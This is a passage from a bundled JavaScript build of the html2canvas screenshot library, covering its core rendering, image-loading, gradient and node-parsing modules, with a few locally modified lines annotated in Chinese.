module.exports = Color;

},{}],4:[function(_dereq_,module,exports){
var Support = _dereq_('./support');
var CanvasRenderer = _dereq_('./renderers/canvas');
var ImageLoader = _dereq_('./imageloader');
var NodeParser = _dereq_('./nodeparser');
var NodeContainer = _dereq_('./nodecontainer');
var log = _dereq_('./log');
var utils = _dereq_('./utils');
var createWindowClone = _dereq_('./clone');
var loadUrlDocument = _dereq_('./proxy').loadUrlDocument;
var getBounds = utils.getBounds;

var html2canvasNodeAttribute = "data-html2canvas-node";
var html2canvasCloneIndex = 0;

function html2canvas(nodeList, options) {
    var index = html2canvasCloneIndex++;
    options = options || {};
    if (options.logging) {
        log.options.logging = true;
        log.options.start = Date.now();
    }

    options.async = typeof(options.async) === "undefined" ? true : options.async;
    options.allowTaint = typeof(options.allowTaint) === "undefined" ? false : options.allowTaint;
    options.removeContainer = typeof(options.removeContainer) === "undefined" ? true : options.removeContainer;
    options.javascriptEnabled = typeof(options.javascriptEnabled) === "undefined" ? false : options.javascriptEnabled;
    options.imageTimeout = typeof(options.imageTimeout) === "undefined" ? 10000 : options.imageTimeout;
    options.renderer = typeof(options.renderer) === "function" ? options.renderer : CanvasRenderer;
    options.strict = !!options.strict;

    if (typeof(nodeList) === "string") {
        if (typeof(options.proxy) !== "string") {
            return Promise.reject("Proxy must be used when rendering url");
        }
        var width = options.width != null ? options.width : window.innerWidth;
        var height = options.height != null ? options.height : window.innerHeight;
        return loadUrlDocument(absoluteUrl(nodeList), options.proxy, document, width, height, options).then(function(container) {
            return renderWindow(container.contentWindow.document.documentElement, container, options, width, height);
        });
    }

    var node = ((nodeList === undefined) ? [document.documentElement] : ((nodeList.length) ? nodeList : [nodeList]))[0];
    node.setAttribute(html2canvasNodeAttribute + index, index);
    width = options.width != null ? options.width : node.ownerDocument.defaultView.innerWidth;
  height = options.height != null ? options.height : node.ownerDocument.defaultView.innerHeight;
  return renderDocument(node.ownerDocument, options, width, height, index).then(function(canvas) {
      if (typeof(options.onrendered) === "function") {
          console.log("options.onrendered is deprecated, html2canvas returns a Promise containing the canvas");
          options.onrendered(canvas);
      }
      return canvas;
  });
}

html2canvas.CanvasRenderer = CanvasRenderer;
html2canvas.NodeContainer = NodeContainer;
html2canvas.log = log;
html2canvas.utils = utils;

var html2canvasExport = (typeof(document) === "undefined" || typeof(Object.create) !== "function" || typeof(document.createElement("canvas").getContext) !== "function") ? function() {
    return Promise.reject("No canvas support");
} : html2canvas;

module.exports = html2canvasExport;

if (typeof(define) === 'function' &amp;&amp; define.amd) {
    define('html2canvas', [], function() {
        return html2canvasExport;
    });
}

function renderDocument(document, options, windowWidth, windowHeight, html2canvasIndex) {
    return createWindowClone(document, document, windowWidth, windowHeight, options, document.defaultView.pageXOffset, document.defaultView.pageYOffset).then(function(container) {
        log("Document cloned");
        var attributeName = html2canvasNodeAttribute + html2canvasIndex;
        var selector = "[" + attributeName + "='" + html2canvasIndex + "']";
        document.querySelector(selector).removeAttribute(attributeName);
        var clonedWindow = container.contentWindow;
        var node = clonedWindow.document.querySelector(selector);
        var oncloneHandler = (typeof(options.onclone) === "function") ? Promise.resolve(options.onclone(clonedWindow.document)) : Promise.resolve(true);
        return oncloneHandler.then(function() {
            return renderWindow(node, container, options, windowWidth, windowHeight);
        });
    });
}

function renderWindow(node, container, options, windowWidth, windowHeight) {
    var clonedWindow = container.contentWindow;
    var support = new Support(clonedWindow.document);
    var imageLoader = new ImageLoader(options, support);
    var bounds = getBounds(node);
    var width = options.type === "view" ? windowWidth : documentWidth(clonedWindow.document);
    var height = options.type === "view" ? windowHeight : documentHeight(clonedWindow.document);
    var renderer = new options.renderer(width, height, imageLoader, options, document);
    var parser = new NodeParser(node, renderer, support, imageLoader, options);
    return parser.ready.then(function() {
        log("Finished rendering");
        var canvas;

        if (options.type === "view") {
            canvas = crop(renderer.canvas, {width: renderer.canvas.width, height: renderer.canvas.height, top: 0, left: 0, x: 0, y: 0});
        }else if (node === clonedWindow.document.body || node === clonedWindow.document.documentElement) {
            canvas = renderer.canvas;
        }else if(options.scale &amp;&amp; options.canvas !=null){
            console.log("放大canvas",options.canvas);
            var scale = options.scale || 1;
            canvas = crop(renderer.canvas, {width: bounds.width * scale, height:bounds.height * scale, top: bounds.top *scale, left: bounds.left *scale, x: 0, y: 0});
        }else{
            canvas = crop(renderer.canvas, {width:  options.width != null ? options.width : bounds.width, height: options.height != null ? options.height : bounds.height, top: bounds.top, left: bounds.left, x: 0, y: 0});
        }

        cleanupContainer(container, options);
        return canvas;
    });
}

function cleanupContainer(container, options) {
    if (options.removeContainer) {
        container.parentNode.removeChild(container);
        log("Cleaned up container");
    }
}

function crop(canvas, bounds) {
    var croppedCanvas = document.createElement("canvas");
    var x1 = Math.min(canvas.width - 1, Math.max(0, bounds.left));
    var x2 = Math.min(canvas.width, Math.max(1, bounds.left + bounds.width));
    var y1 = Math.min(canvas.height - 1, Math.max(0, bounds.top));
    var y2 = Math.min(canvas.height, Math.max(1, bounds.top + bounds.height));
    croppedCanvas.width = bounds.width;
    croppedCanvas.height =  bounds.height;
    var width = x2-x1;
    var height = y2-y1;
    log("Cropping canvas at:", "left:", bounds.left, "top:", bounds.top, "width:", width, "height:", height);
    log("Resulting crop with width", bounds.width, "and height", bounds.height, "with x", x1, "and y", y1);
    croppedCanvas.getContext("2d").drawImage(canvas, x1, y1, width, height, bounds.x, bounds.y, width, height);
    return croppedCanvas;
}

function documentWidth (doc) {
    return Math.max(
        Math.max(doc.body.scrollWidth, doc.documentElement.scrollWidth),
        Math.max(doc.body.offsetWidth, doc.documentElement.offsetWidth),
        Math.max(doc.body.clientWidth, doc.documentElement.clientWidth)
    );
}

function documentHeight (doc) {
    return Math.max(
        Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight),
        Math.max(doc.body.offsetHeight, doc.documentElement.offsetHeight),
        Math.max(doc.body.clientHeight, doc.documentElement.clientHeight)
    );
}

function absoluteUrl(url) {
    var link = document.createElement("a");
    link.href = url;
    link.href = link.href;
    return link;
}

},{"./clone":2,"./imageloader":11,"./log":13,"./nodecontainer":14,"./nodeparser":15,"./proxy":16,"./renderers/canvas":20,"./support":22,"./utils":26}],5:[function(_dereq_,module,exports){
var log = _dereq_('./log');
var smallImage = _dereq_('./utils').smallImage;

function DummyImageContainer(src) {
    this.src = src;
    log("DummyImageContainer for", src);
    if (!this.promise || !this.image) {
        log("Initiating DummyImageContainer");
        DummyImageContainer.prototype.image = new Image();
        var image = this.image;
        DummyImageContainer.prototype.promise = new Promise(function(resolve, reject) {
            image.onload = resolve;
            image.onerror = reject;
            image.src = smallImage();
            if (image.complete === true) {
                resolve(image);
            }
        });
    }
}

module.exports = DummyImageContainer;

},{"./log":13,"./utils":26}],6:[function(_dereq_,module,exports){
var smallImage = _dereq_('./utils').smallImage;

function Font(family, size) {
    var container = document.createElement('div'),
        img = document.createElement('img'),
        span = document.createElement('span'),
        sampleText = 'Hidden Text',
        baseline,
        middle;

    container.style.visibility = "hidden";
    container.style.fontFamily = family;
    container.style.fontSize = size;
    container.style.margin = 0;
    container.style.padding = 0;

    document.body.appendChild(container);

    img.src = smallImage();
    img.width = 1;
    img.height = 1;

    img.style.margin = 0;
    img.style.padding = 0;
    img.style.verticalAlign = "baseline";

    span.style.fontFamily = family;
    span.style.fontSize = size;
    span.style.margin = 0;
    span.style.padding = 0;

    span.appendChild(document.createTextNode(sampleText));
    container.appendChild(span);
    container.appendChild(img);
    baseline = (img.offsetTop - span.offsetTop) + 1;

    container.removeChild(span);
    container.appendChild(document.createTextNode(sampleText));

    container.style.lineHeight = "normal";
    img.style.verticalAlign = "super";

    middle = (img.offsetTop-container.offsetTop) + 1;

    document.body.removeChild(container);

    this.baseline = baseline;
    this.lineWidth = 1;
    this.middle = middle;
}

module.exports = Font;

},{"./utils":26}],7:[function(_dereq_,module,exports){
var Font = _dereq_('./font');

function FontMetrics() {
    this.data = {};
}

FontMetrics.prototype.getMetrics = function(family, size) {
    if (this.data[family + "-" + size] === undefined) {
        this.data[family + "-" + size] = new Font(family, size);
    }
    return this.data[family + "-" + size];
};

module.exports = FontMetrics;

},{"./font":6}],8:[function(_dereq_,module,exports){
var utils = _dereq_('./utils');
var getBounds = utils.getBounds;
var loadUrlDocument = _dereq_('./proxy').loadUrlDocument;

function FrameContainer(container, sameOrigin, options) {
    this.image = null;
    this.src = container;
    var self = this;
    var bounds = getBounds(container);
    this.promise = (!sameOrigin ? this.proxyLoad(options.proxy, bounds, options) : new Promise(function(resolve) {
        if (container.contentWindow.document.URL === "about:blank" || container.contentWindow.document.documentElement == null) {
            container.contentWindow.onload = container.onload = function() {
                resolve(container);
            };
        } else {
            resolve(container);
        }
    })).then(function(container) {
        var html2canvas = _dereq_('./core');
        return html2canvas(container.contentWindow.document.documentElement, {type: 'view', width: container.width, height: container.height, proxy: options.proxy, javascriptEnabled: options.javascriptEnabled, removeContainer: options.removeContainer, allowTaint: options.allowTaint, imageTimeout: options.imageTimeout / 2});
    }).then(function(canvas) {
        return self.image = canvas;
    });
}

FrameContainer.prototype.proxyLoad = function(proxy, bounds, options) {
    var container = this.src;
    return loadUrlDocument(container.src, proxy, container.ownerDocument, bounds.width, bounds.height, options);
};

module.exports = FrameContainer;

},{"./core":4,"./proxy":16,"./utils":26}],9:[function(_dereq_,module,exports){
function GradientContainer(imageData) {
    this.src = imageData.value;
    this.colorStops = [];
    this.type = null;
    this.x0 = 0.5;
    this.y0 = 0.5;
    this.x1 = 0.5;
    this.y1 = 0.5;
    this.promise = Promise.resolve(true);
}

GradientContainer.TYPES = {
    LINEAR: 1,
    RADIAL: 2
};

// TODO: support hsl[a], negative %/length values
// TODO: support &lt;angle&gt; (e.g. -?\d{1,3}(?:\.\d+)deg, etc. : https://developer.mozilla.org/docs/Web/CSS/angle )
GradientContainer.REGEXP_COLORSTOP = /^\s*(rgba?\(\s*\d{1,3},\s*\d{1,3},\s*\d{1,3}(?:,\s*[0-9\.]+)?\s*\)|[a-z]{3,20}|#[a-f0-9]{3,6})(?:\s+(\d{1,3}(?:\.\d+)?)(%|px)?)?(?:\s|$)/i;

module.exports = GradientContainer;

},{}],10:[function(_dereq_,module,exports){
function ImageContainer(src, cors) {
    this.src = src;
    this.image = new Image();
    var self = this;
    this.tainted = null;
    this.promise = new Promise(function(resolve, reject) {
        self.image.onload = resolve;
        self.image.onerror = reject;
        if (cors) {
            self.image.crossOrigin = "anonymous";//去掉源码的anonymous，改为空
            // self.image.crossOrigin = "";
        }
        self.image.src = src;//在源码src后面添加随机数，如时间戳+"?"+new Date().getTime()
        // self.image.src = src+"?"+new Date().getTime();
        if (self.image.complete === true) {
            resolve(self.image);
        }
    });
}

module.exports = ImageContainer;

},{}],11:[function(_dereq_,module,exports){
var log = _dereq_('./log');
var ImageContainer = _dereq_('./imagecontainer');
var DummyImageContainer = _dereq_('./dummyimagecontainer');
var ProxyImageContainer = _dereq_('./proxyimagecontainer');
var FrameContainer = _dereq_('./framecontainer');
var SVGContainer = _dereq_('./svgcontainer');
var SVGNodeContainer = _dereq_('./svgnodecontainer');
var LinearGradientContainer = _dereq_('./lineargradientcontainer');
var WebkitGradientContainer = _dereq_('./webkitgradientcontainer');
var bind = _dereq_('./utils').bind;

function ImageLoader(options, support) {
    this.link = null;
    this.options = options;
    this.support = support;
    this.origin = this.getOrigin(window.location.href);
}

ImageLoader.prototype.findImages = function(nodes) {
    var images = [];
    nodes.reduce(function(imageNodes, container) {
        switch(container.node.nodeName) {
        case "IMG":
            return imageNodes.concat([{
                args: [container.node.src],
                method: "url"
            }]);
        case "svg":
        case "IFRAME":
            return imageNodes.concat([{
                args: [container.node],
                method: container.node.nodeName
            }]);
        }
        return imageNodes;
    }, []).forEach(this.addImage(images, this.loadImage), this);
    return images;
};

ImageLoader.prototype.findBackgroundImage = function(images, container) {
    container.parseBackgroundImages().filter(this.hasImageBackground).forEach(this.addImage(images, this.loadImage), this);
    return images;
};

ImageLoader.prototype.addImage = function(images, callback) {
    return function(newImage) {
        newImage.args.forEach(function(image) {
            if (!this.imageExists(images, image)) {
                images.splice(0, 0, callback.call(this, newImage));
                log('Added image #' + (images.length), typeof(image) === "string" ? image.substring(0, 100) : image);
            }
        }, this);
    };
};

ImageLoader.prototype.hasImageBackground = function(imageData) {
    return imageData.method !== "none";
};

ImageLoader.prototype.loadImage = function(imageData) {
    if (imageData.method === "url") {
        var src = imageData.args[0];
        if (this.isSVG(src) &amp;&amp; !this.support.svg &amp;&amp; !this.options.allowTaint) {
            return new SVGContainer(src);
        } else if (src.match(/data:image\/.*;base64,/i)) {
            return new ImageContainer(src.replace(/url\(['"]{0,}|['"]{0,}\)$/ig, ''), false);
        } else if (this.isSameOrigin(src) || this.options.allowTaint === true || this.isSVG(src)) {
            return new ImageContainer(src, false);
        } else if (this.support.cors &amp;&amp; !this.options.allowTaint &amp;&amp; this.options.useCORS) {
            return new ImageContainer(src, true);
        } else if (this.options.proxy) {
            return new ProxyImageContainer(src, this.options.proxy);
        } else {
            return new DummyImageContainer(src);
        }
    } else if (imageData.method === "linear-gradient") {
        return new LinearGradientContainer(imageData);
    } else if (imageData.method === "gradient") {
        return new WebkitGradientContainer(imageData);
    } else if (imageData.method === "svg") {
        return new SVGNodeContainer(imageData.args[0], this.support.svg);
    } else if (imageData.method === "IFRAME") {
        return new FrameContainer(imageData.args[0], this.isSameOrigin(imageData.args[0].src), this.options);
    } else {
        return new DummyImageContainer(imageData);
    }
};

ImageLoader.prototype.isSVG = function(src) {
    return src.substring(src.length - 3).toLowerCase() === "svg" || SVGContainer.prototype.isInline(src);
};

ImageLoader.prototype.imageExists = function(images, src) {
    return images.some(function(image) {
        return image.src === src;
    });
};

ImageLoader.prototype.isSameOrigin = function(url) {
    return (this.getOrigin(url) === this.origin);
};

ImageLoader.prototype.getOrigin = function(url) {
    var link = this.link || (this.link = document.createElement("a"));
    link.href = url;
    link.href = link.href; // IE9, LOL! - http://jsfiddle.net/niklasvh/2e48b/
    return link.protocol + link.hostname + link.port;
};

ImageLoader.prototype.getPromise = function(container) {
    return this.timeout(container, this.options.imageTimeout)['catch'](function() {
        var dummy = new DummyImageContainer(container.src);
        return dummy.promise.then(function(image) {
            container.image = image;
        });
    });
};

ImageLoader.prototype.get = function(src) {
    var found = null;
    return this.images.some(function(img) {
        return (found = img).src === src;
    }) ? found : null;
};

ImageLoader.prototype.fetch = function(nodes) {
    this.images = nodes.reduce(bind(this.findBackgroundImage, this), this.findImages(nodes));
    this.images.forEach(function(image, index) {
        image.promise.then(function() {
            log("Succesfully loaded image #"+ (index+1), image);
        }, function(e) {
            log("Failed loading image #"+ (index+1), image, e);
        });
    });
    this.ready = Promise.all(this.images.map(this.getPromise, this));
    log("Finished searching images");
    return this;
};

ImageLoader.prototype.timeout = function(container, timeout) {
    var timer;
    var promise = Promise.race([container.promise, new Promise(function(res, reject) {
        timer = setTimeout(function() {
            log("Timed out loading image", container);
            reject(container);
        }, timeout);
    })]).then(function(container) {
        clearTimeout(timer);
        return container;
    });
    promise['catch'](function() {
        clearTimeout(timer);
    });
    return promise;
};

module.exports = ImageLoader;

},{"./dummyimagecontainer":5,"./framecontainer":8,"./imagecontainer":10,"./lineargradientcontainer":12,"./log":13,"./proxyimagecontainer":17,"./svgcontainer":23,"./svgnodecontainer":24,"./utils":26,"./webkitgradientcontainer":27}],12:[function(_dereq_,module,exports){
var GradientContainer = _dereq_('./gradientcontainer');
var Color = _dereq_('./color');

function LinearGradientContainer(imageData) {
    GradientContainer.apply(this, arguments);
    this.type = GradientContainer.TYPES.LINEAR;

    var hasDirection = LinearGradientContainer.REGEXP_DIRECTION.test( imageData.args[0] ) ||
        !GradientContainer.REGEXP_COLORSTOP.test( imageData.args[0] );

    if (hasDirection) {
        imageData.args[0].split(/\s+/).reverse().forEach(function(position, index) {
            switch(position) {
            case "left":
                this.x0 = 0;
                this.x1 = 1;
                break;
            case "top":
                this.y0 = 0;
                this.y1 = 1;
                break;
            case "right":
                this.x0 = 1;
                this.x1 = 0;
                break;
            case "bottom":
                this.y0 = 1;
                this.y1 = 0;
                break;
            case "to":
                var y0 = this.y0;
                var x0 = this.x0;
                this.y0 = this.y1;
                this.x0 = this.x1;
                this.x1 = x0;
                this.y1 = y0;
                break;
            case "center":
                break; // centered by default
            // Firefox internally converts position keywords to percentages:
            // http://www.w3.org/TR/2010/WD-CSS2-20101207/colors.html#propdef-background-position
            default: // percentage or absolute length
                // TODO: support absolute start point positions (e.g., use bounds to convert px to a ratio)
                var ratio = parseFloat(position, 10) * 1e-2;
                if (isNaN(ratio)) { // invalid or unhandled value
                    break;
                }
                if (index === 0) {
                    this.y0 = ratio;
                    this.y1 = 1 - this.y0;
                } else {
                    this.x0 = ratio;
                    this.x1 = 1 - this.x0;
                }
                break;
            }
        }, this);
    } else {
        this.y0 = 0;
        this.y1 = 1;
    }

    this.colorStops = imageData.args.slice(hasDirection ? 1 : 0).map(function(colorStop) {
        var colorStopMatch = colorStop.match(GradientContainer.REGEXP_COLORSTOP);
        var value = +colorStopMatch[2];
        var unit = value === 0 ? "%" : colorStopMatch[3]; // treat "0" as "0%"
        return {
            color: new Color(colorStopMatch[1]),
            // TODO: support absolute stop positions (e.g., compute gradient line length &amp; convert px to ratio)
            stop: unit === "%" ? value / 100 : null
        };
    });

    if (this.colorStops[0].stop === null) {
        this.colorStops[0].stop = 0;
    }

    if (this.colorStops[this.colorStops.length - 1].stop === null) {
        this.colorStops[this.colorStops.length - 1].stop = 1;
    }

    // calculates and fills-in explicit stop positions when omitted from rule
    this.colorStops.forEach(function(colorStop, index) {
        if (colorStop.stop === null) {
            this.colorStops.slice(index).some(function(find, count) {
                if (find.stop !== null) {
                    colorStop.stop = ((find.stop - this.colorStops[index - 1].stop) / (count + 1)) + this.colorStops[index - 1].stop;
                    return true;
                } else {
                    return false;
                }
            }, this);
        }
    }, this);
}

LinearGradientContainer.prototype = Object.create(GradientContainer.prototype);

// TODO: support &lt;angle&gt; (e.g. -?\d{1,3}(?:\.\d+)deg, etc. : https://developer.mozilla.org/docs/Web/CSS/angle )
LinearGradientContainer.REGEXP_DIRECTION = /^\s*(?:to|left|right|top|bottom|center|\d{1,3}(?:\.\d+)?%?)(?:\s|$)/i;

module.exports = LinearGradientContainer;

},{"./color":3,"./gradientcontainer":9}],13:[function(_dereq_,module,exports){
var logger = function() {
    if (logger.options.logging &amp;&amp; window.console &amp;&amp; window.console.log) {
        Function.prototype.bind.call(window.console.log, (window.console)).apply(window.console, [(Date.now() - logger.options.start) + "ms", "html2canvas:"].concat([].slice.call(arguments, 0)));
    }
};

logger.options = {logging: false};
module.exports = logger;

},{}],14:[function(_dereq_,module,exports){
var Color = _dereq_('./color');
var utils = _dereq_('./utils');
var getBounds = utils.getBounds;
var parseBackgrounds = utils.parseBackgrounds;
var offsetBounds = utils.offsetBounds;

function NodeContainer(node, parent) {
    this.node = node;
    this.parent = parent;
    this.stack = null;
    this.bounds = null;
    this.borders = null;
    this.clip = [];
    this.backgroundClip = [];
    this.offsetBounds = null;
    this.visible = null;
    this.computedStyles = null;
    this.colors = {};
    this.styles = {};
    this.backgroundImages = null;
    this.transformData = null;
    this.transformMatrix = null;
    this.isPseudoElement = false;
    this.opacity = null;
}

NodeContainer.prototype.cloneTo = function(stack) {
    stack.visible = this.visible;
    stack.borders = this.borders;
    stack.bounds = this.bounds;
    stack.clip = this.clip;
    stack.backgroundClip = this.backgroundClip;
    stack.computedStyles = this.computedStyles;
    stack.styles = this.styles;
    stack.backgroundImages = this.backgroundImages;
    stack.opacity = this.opacity;
};

NodeContainer.prototype.getOpacity = function() {
    return this.opacity === null ? (this.opacity = this.cssFloat('opacity')) : this.opacity;
};

NodeContainer.prototype.assignStack = function(stack) {
    this.stack = stack;
    stack.children.push(this);
};

NodeContainer.prototype.isElementVisible = function() {
    return this.node.nodeType === Node.TEXT_NODE ? this.parent.visible : (
        this.css('display') !== "none" &amp;&amp;
        this.css('visibility') !== "hidden" &amp;&amp;
        !this.node.hasAttribute("data-html2canvas-ignore") &amp;&amp;
        (this.node.nodeName !== "INPUT" || this.node.getAttribute("type") !== "hidden")
    );
};

NodeContainer.prototype.css = function(attribute) {
    if (!this.computedStyles) {
        this.computedStyles = this.isPseudoElement ? this.parent.computedStyle(this.before ? ":before" : ":after") : this.computedStyle(null);
    }

    return this.styles[attribute] || (this.styles[attribute] = this.computedStyles[attribute]);
};

NodeContainer.prototype.prefixedCss = function(attribute) {
    var prefixes = ["webkit", "moz", "ms", "o"];
    var value = this.css(attribute);
    if (value === undefined) {
        prefixes.some(function(prefix) {
            value = this.css(prefix + attribute.substr(0, 1).toUpperCase() + attribute.substr(1));
            return value !== undefined;
        }, this);
    }
    return value === undefined ? null : value;
};

NodeContainer.prototype.computedStyle = function(type) {
    return this.node.ownerDocument.defaultView.getComputedStyle(this.node, type);
};

NodeContainer.prototype.cssInt = function(attribute) {
    var value = parseInt(this.css(attribute), 10);
    return (isNaN(value)) ? 0 : value; // borders in old IE are throwing 'medium' for demo.html
};

NodeContainer.prototype.color = function(attribute) {
    return this.colors[attribute] || (this.colors[attribute] = new Color(this.css(attribute)));
};

NodeContainer.prototype.cssFloat = function(attribute) {
    var value = parseFloat(this.css(attribute));
    return (isNaN(value)) ? 0 : value;
};

NodeContainer.prototype.fontWeight = function() {
    var weight = this.css("fontWeight");
    switch(parseInt(weight, 10)){
    case 401:
        weight = "bold";
        break;
    case 400:
        weight = "normal";
        break;
    }
    return weight;
};

NodeContainer.prototype.parseClip = function() {
    var matches = this.css('clip').match(this.CLIP);
    if (matches) {
        return {
            top: parseInt(matches[1], 10),
            right: parseInt(matches[2], 10),
            bottom: parseInt(matches[3], 10),
            left: parseInt(matches[4], 10)
        };
    }
    return null;
};

NodeContainer.prototype.parseBackgroundImages = function() {
    return this.backgroundImages || (this.backgroundImages = parseBackgrounds(this.css("backgroundImage")));
};

NodeContainer.prototype.cssList = function(property, index) {
    var value = (this.css(property) || '').split(',');
    value = value[index || 0] || value[0] || 'auto';
    value = value.trim().split(' ');
    if (value.length === 1) {
        value = [value[0], isPercentage(value[0]) ? 'auto' : value[0]];
    }
    return value;
};

NodeContainer.prototype.parseBackgroundSize = function(bounds, image, index) {
    var size = this.cssList("backgroundSize", index);
    var width, height;

    if (isPercentage(size[0])) {
        width = bounds.width * parseFloat(size[0]) / 100;
    } else if (/contain|cover/.test(size[0])) {
        var targetRatio = bounds.width / bounds.height, currentRatio = image.width / image.height;
        return (targetRatio &lt; currentRatio ^ size[0] === 'contain') ?  {width: bounds.height * currentRatio, height: bounds.height} : {width: bounds.width, height: bounds.width / currentRatio};
    } else {
        width = parseInt(size[0], 10);
    }

    if (size[0] === 'auto' &amp;&amp; size[1] === 'auto') {
        height = image.height;
    } else if (size[1] === 'auto') {
        height = width / image.width * image.height;
    } else if (isPercentage(size[1])) {
        height =  bounds.height * parseFloat(size[1]) / 100;
    } else {
        height = parseInt(size[1], 10);
    }

    if (size[0] === 'auto') {
        width = height / image.height * image.width;
    }

    return {width: width, height: height};
};

NodeContainer.prototype.parseBackgroundPosition = function(bounds, image, index, backgroundSize) {
    var position = this.cssList('backgroundPosition', index);
    var left, top;

    if (isPercentage(position[0])){
        left = (bounds.width - (backgroundSize || image).width) * (parseFloat(position[0]) / 100);
    } else {
        left = parseInt(position[0], 10);
    }

    if (position[1] === 'auto') {
        top = left / image.width * image.height;
    } else if (isPercentage(position[1])){
        top =  (bounds.height - (backgroundSize || image).height) * parseFloat(position[1]) / 100;
    } else {
        top = parseInt(position[1], 10);
    }

    if (position[0] === 'auto') {
        left = top / image.height * image.width;
    }

    return {left: left, top: top};
};

NodeContainer.prototype.parseBackgroundRepeat = function(index) {
    return this.cssList("backgroundRepeat", index)[0];
};

NodeContainer.prototype.parseTextShadows = function() {
    var textShadow = this.css("textShadow");
    var results = [];

    if (textShadow &amp;&amp; textShadow !== 'none') {
        var shadows = textShadow.match(this.TEXT_SHADOW_PROPERTY);
        for (var i = 0; shadows &amp;&amp; (i &lt; shadows.length); i++) {
            var s = shadows[i].match(this.TEXT_SHADOW_VALUES);
            results.push({
                color: new Color(s[0]),
                offsetX: s[1] ? parseFloat(s[1].replace('px', '')) : 0,
                offsetY: s[2] ? parseFloat(s[2].replace('px', '')) : 0,
                blur: s[3] ? s[3].replace('px', '') : 0
            });
        }
    }
    return results;
};

NodeContainer.prototype.parseTransform = function() {
    if (!this.transformData) {
        if (this.hasTransform()) {
            var offset = this.parseBounds();
            var origin = this.prefixedCss("transformOrigin").split(" ").map(removePx).map(asFloat);
            origin[0] += offset.left;
            origin[1] += offset.top;
            this.transformData = {
                origin: origin,
                matrix: this.parseTransformMatrix()
            };
        } else {
            this.transformData = {
                origin: [0, 0],
                matrix: [1, 0, 0, 1, 0, 0]
            };
        }
    }
    return this.transformData;
};

NodeContainer.prototype.parseTransformMatrix = function() {
    if (!this.transformMatrix) {
        var transform = this.prefixedCss("transform");
        var matrix = transform ? parseMatrix(transform.match(this.MATRIX_PROPERTY)) : null;
        this.transformMatrix = matrix ? matrix : [1, 0, 0, 1, 0, 0];
    }
    return this.transformMatrix;
};

NodeContainer.prototype.parseBounds = function() {
    return this.bounds || (this.bounds = this.hasTransform() ? offsetBounds(this.node) : getBounds(this.node));
};

NodeContainer.prototype.hasTransform = function() {
    return this.parseTransformMatrix().join(",") !== "1,0,0,1,0,0" || (this.parent &amp;&amp; this.parent.hasTransform());
};

NodeContainer.prototype.getValue = function() {
    var value = this.node.value || "";
    if (this.node.tagName === "SELECT") {
        value = selectionValue(this.node);
    } else if (this.node.type === "password") {
        value = Array(value.length + 1).join('\u2022'); // jshint ignore:line
    }
    return value.length === 0 ? (this.node.placeholder || "") : value;
};

NodeContainer.prototype.MATRIX_PROPERTY = /(matrix|matrix3d)\((.+)\)/;
NodeContainer.prototype.TEXT_SHADOW_PROPERTY = /((rgba|rgb)\([^\)]+\)(\s-?\d+px){0,})/g;
NodeContainer.prototype.TEXT_SHADOW_VALUES = /(-?\d+px)|(#.+)|(rgb\(.+\))|(rgba\(.+\))/g;
NodeContainer.prototype.CLIP = /^rect\((\d+)px,? (\d+)px,? (\d+)px,? (\d+)px\)$/;

function selectionValue(node) {
    var option = node.options[node.selectedIndex || 0];
    return option ? (option.text || "") : "";
}

function parseMatrix(match) {
    if (match &amp;&amp; match[1] === "matrix") {
        return match[2].split(",").map(function(s) {
            return parseFloat(s.trim());
        });
    } else if (match &amp;&amp; match[1] === "matrix3d") {
        var matrix3d = match[2].split(",").map(function(s) {
          return parseFloat(s.trim());
        });
        return [matrix3d[0], matrix3d[1], matrix3d[4], matrix3d[5], matrix3d[12], matrix3d[13]];
    }
}

function isPercentage(value) {
    return value.toString().indexOf("%") !== -1;
}

function removePx(str) {
    return str.replace("px", "");
}

function asFloat(str) {
    return parseFloat(str);
}

module.exports = NodeContainer;

},{"./color":3,"./utils":26}],15:[function(_dereq_,module,exports){
var log = _dereq_('./log');
var punycode = _dereq_('punycode');
var NodeContainer = _dereq_('./nodecontainer');
var TextContainer = _dereq_('./textcontainer');
var PseudoElementContainer = _dereq_('./pseudoelementcontainer');
var FontMetrics = _dereq_('./fontmetrics');
var Color = _dereq_('./color');
var StackingContext = _dereq_('./stackingcontext');
var utils = _dereq_('./utils');
var bind = utils.bind;
var getBounds = utils.getBounds;
var parseBackgrounds = utils.parseBackgrounds;
var offsetBounds = utils.offsetBounds;

function NodeParser(element, renderer, support, imageLoader, options) {
    log("Starting NodeParser");
    this.renderer = renderer;
    this.options = options;
    this.range = null;
    this.support = support;
    this.renderQueue = [];
    this.stack = new StackingContext(true, 1, element.ownerDocument, null);
    var parent = new NodeContainer(element, null);
    if (options.background) {
        renderer.rectangle(0, 0, renderer.width, renderer.height, new Color(options.background));
    }
    if (element === element.ownerDocument.documentElement) {
        // http://www.w3.org/TR/css3-background/#special-backgrounds
        var canvasBackground = new NodeContainer(parent.color('backgroundColor').isTransparent() ? element.ownerDocument.body : element.ownerDocument.documentElement, null);
        renderer.rectangle(0, 0, renderer.width, renderer.height, canvasBackground.color('backgroundColor'));
    }
    parent.visibile = parent.isElementVisible();
    this.createPseudoHideStyles(element.ownerDocument);
    this.disableAnimations(element.ownerDocument);
    this.nodes = flatten([parent].concat(this.getChildren(parent)).filter(function(container) {
        return container.visible = container.isElementVisible();
    }).map(this.getPseudoElements, this));
    this.fontMetrics = new FontMetrics();
    log("Fetched nodes, total:", this.nodes.length);
    log("Calculate overflow clips");
    this.calculateOverflowClips();
    log("Start fetching images");
    this.images = imageLoader.fetch(this.nodes.filter(isElement));
    this.ready = this.images.ready.then(bind(function() {
        log("Images loaded, starting parsing");
        log("Creating stacking contexts");
        this.createStackingContexts();
        log("Sorting stacking contexts");
        this.sortStackingContexts(this.stack);
        this.parse(this.stack);
        log("Render queue created with " + this.renderQueue.length + " items");
        return new Promise(bind(function(resolve) {
            if (!options.async) {
                this.renderQueue.forEach(this.paint, this);
                resolve();
            } else if (typeof(options.async) === "function") {
                options.async.call(this, this.renderQueue, resolve);
            } else if (this.renderQueue.length &gt; 0){
                this.renderIndex = 0;
                this.asyncRenderer(this.renderQueue, resolve);
            } else {
                resolve();
            }
        }, this));
    }, this));
}

NodeParser.prototype.calculateOverflowClips = function() {
    this.nodes.forEach(function(container) {
        if (isElement(container)) {
            if (isPseudoElement(container)) {
                container.appendToDOM();
            }
            container.borders = this.parseBorders(container);
            var clip = (container.css('overflow') === "hidden") ? [container.borders.clip] : [];
            var cssClip = container.parseClip();
            if (cssClip &amp;&amp; ["absolute", "fixed"].indexOf(container.css('position')) !== -1) {
                clip.push([["rect",
                        container.bounds.left + cssClip.left,
                        container.bounds.top + cssClip.top,
